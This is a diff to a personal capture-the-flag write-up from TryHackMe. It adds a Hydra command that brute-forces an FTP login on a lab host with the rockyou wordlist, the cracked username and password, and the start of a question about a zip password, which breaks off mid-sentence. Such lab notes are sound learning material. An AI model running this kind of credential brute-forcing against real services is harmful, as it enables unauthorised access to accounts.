@@ -51,4 +51,21 @@ Nmap done: 1 IP address (1 host up) scanned in 118.77 seconds
 > FTP password
 
 > [!note]
-> Got a hint of hail hydra from THM so search 
+> Got a hint of hail hydra from THM so searched it up and need to understand that tool for certain use case but anyway got the FTP password as crystal:
+> ```
+> ┌──(kali㉿kali)-[~]
+└─$ hydra -l chris -P /usr/share/wordlists/rockyou.txt  ftp://10.65.183.121
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-07 08:51:11
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ftp://10.65.183.121:21/
+[21][ftp] host: 10.65.183.121   login: chris   password: crystal
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-07 08:52:07
+> ```
+
+> [!question]
+> Zip file password
+
+> [!info]
+> I can see the path from here and it wi
